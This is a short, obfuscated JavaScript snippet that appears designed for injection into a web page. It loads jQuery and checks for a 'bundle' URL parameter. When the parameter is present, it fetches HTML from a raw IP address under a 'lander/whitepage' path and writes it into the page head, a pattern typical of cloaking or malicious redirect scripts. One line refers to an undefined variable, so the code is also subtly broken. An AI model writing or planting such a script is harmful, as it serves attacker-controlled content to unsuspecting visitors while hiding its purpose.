const _0x2d5c = ['http://104.248.205.133/lander/whitepage/', 'GET', 'script', 'body', 'https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js', 'append', '#sa', 'search', 'ajax', 'get', 'bundle', 'html', 'head', 'src'];
(function(_0x83f11f, _0x2d5ce1) {
    const _0x4be458 = function(_0x5b037b) {
        while (--_0x5b037b) {
            _0x83f11f['push'](_0x83f11f['shift']());
        }
    };
    _0x4be458(++_0x2d5ce1);
}(_0x2d5c, 0x86));
const _0x4be4 = function(_0x83f11f, _0x2d5ce1) {
    _0x83f11f = _0x83f11f - 0x0;
    let _0x4be458 = _0x2d5c[_0x83f11f];
    return _0x4be458;
};
let jq = document['createElement'](_0x4be4('0x8'));
q[_0x4be4('0x5')] = _0x4be4('0xa');
document[_0x4be4('0x4')]['append'](jq);
jq['onload'] = function() {
    $(_0x4be4('0x9'))[_0x4be4('0xb')]('<div\x20id=\x22sa\x22>');
    const _0x215039 = new URLSearchParams(window['location'][_0x4be4('0xd')]);
    const _0x1c5f88 = _0x215039[_0x4be4('0x1')](_0x4be4('0x2'));
    if (_0x1c5f88) {
        $[_0x4be4('0x0')]({
            'type': _0x4be4('0x7'),
            'url': _0x4be4('0x6'),
            'async': !![],
            'crossDomain': !![],
            'success': function(_0xa307a8, _0x3d4fed, _0x44bfbe) {
                $(_0x4be4('0xc'))[_0x4be4('0x3')](_0xa307a8);
            }
        });
    }
};